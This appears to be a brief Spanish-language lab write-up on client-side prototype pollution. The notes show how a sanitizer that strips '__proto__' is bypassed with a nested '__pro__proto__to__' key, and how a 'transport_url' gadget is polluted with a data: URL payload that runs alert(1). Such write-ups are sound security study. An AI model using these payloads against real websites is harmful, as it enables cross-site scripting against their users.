![[Pasted image 20230528195512.png]]

al cargar el lab nos damos cuenta que el sitio tiene una funcion para sanitizar los inputs:

![[Pasted image 20230528195805.png]]

probando el funcionamiento de esta opcion:

/?__proto__.foo=bar

![[Pasted image 20230528200234.png]]

intentando con este payload:

?__pro__proto__to__[foo]=bar

![[Pasted image 20230528200815.png]]

ahora para ejecutar codigo verificamos la funcion posterior a la sanitizacion:

![[Pasted image 20230528201005.png]]

vemos que config.transport.url hace la magia de la ejecuion:

?__pro__proto__to__[transport_url]=data.,alert(1);

si el payload no funciona se obtiene este error en el script:

![[Pasted image 20230528201323.png]]

intentando nuevamente:

/?__pro__proto__to__[transport_url]=data:,alert(1);

![[Pasted image 20230528201441.png]]


![[Pasted image 20230528201525.png]]

